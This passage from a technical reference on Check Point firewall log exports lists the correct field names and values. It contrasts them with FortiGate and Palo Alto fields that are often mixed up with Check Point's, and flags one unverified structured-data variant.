- **Console view:** SmartConsole → Logs & Monitor shows display names (Source, Destination, Blade, Access Rule Name, Protection Name, Severity "Critical", Confidence "High"). The exported log has the raw names and numeric codes. Query syntax: `src:10.20.14.37 AND blade:"URL Filtering"`.

## 6. Common mistakes / fields that do NOT exist in Check Point logs

- No `srcip` / `dstip` / `srcport` / `dstport` / `policyid` / `sentbyte` / `logid="0000000013"` / `devname` — those are **FortiGate**.
- No `sport` / `dport` / `natsrc` / `rule` / `from` / `to` / `threatid` / `misc` — those are **Palo Alto**. Check Point source port is `s_port`, destination port is `service`.
- No `dport`, no `src_port`, no `dst_port`.
- `severity` is **not** a word in exported logs (`"4"`, not `"Critical"`); `confidence_level` likewise.
- `product` is the blade, and IPS is exported as `SmartDefense`, not `IPS`.
- `appi_name` (with an **i**) — not `app_name`. `resource` holds the URL — there is no `url` field in gateway URLF logs.
- A second real-world variant exists: RFC 5424 structured data `[Fields@1.3.6.1.4.1.2620 key="value" …]` carrying `ProductName`, `ProductFamily`, `svc`, `sport_svc`, `xlatesport_svc`, `UP_match_table`/`ROW_START` markers (seen in elastic test data). Which exporter/forwarder setting produces it is UNVERIFIED. It is **not** the default Log Exporter syslog format described here — never mix keys from the two variants in one log (e.g. `ProductName` next to `product`, or `sport_svc` next to `s_port`).
- Don't wrap in `checkpoint.*`, `data.*`, `rule.*` — SIEM envelopes.
